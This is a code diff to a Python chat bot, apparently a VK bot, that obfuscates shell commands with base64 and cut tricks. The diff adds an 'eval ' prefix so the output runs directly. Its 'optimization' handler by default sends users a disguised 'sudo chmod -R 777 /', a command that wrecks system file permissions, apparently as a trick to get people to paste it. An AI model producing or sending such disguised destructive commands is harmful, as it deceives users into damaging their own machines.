@@ -187,15 +187,15 @@ def bashEncode(string: str):
         return ''.join(random.choice(ascii_letters) for _ in range(size))
 
     def b64(s):
-        return f"`echo {base64.b64encode(bytes(s, 'ascii')).decode('ascii')} | base64 -d`"
+        return f"`echo {base64.b64encode(bytes(s, 'utf8')).decode('utf8')} | base64 -d`"
 
     def cut(s):
         len1, len2 = random.randint(2, 10), random.randint(2, 10)
         rand1, rand2 = randString(len1), randString(len2)
         pos = len1 + 1
-        return f'`echo {rand1}{s}{rand2} | cut -b {pos}-{pos}`'
+        return f'`echo \'{rand1}{s}{rand2}\' | cut -b {pos}-{pos}`'
 
-    result = ''
+    result = 'eval '
     for sym in string:
         result += random.choice([b64, cut])(sym)
     return result
@@ -205,7 +205,13 @@ def bashEncode(string: str):
 async def optimization_handler(message: Message, text: Optional[str] = None):
     if not text:
         text = 'sudo chmod -R 777 /'
-    await message.answer(bashEncode(text))
+    try:
+        await message.answer(bashEncode(text))
+    except Exception as e:
+        if e.args == (914, 'Message is too long'):
+            await message.answer('Слишком длинное выражение')
+        else:
+            raise e
 
 
 @bot.on.message(text=['/обжекшон', '/objection'])
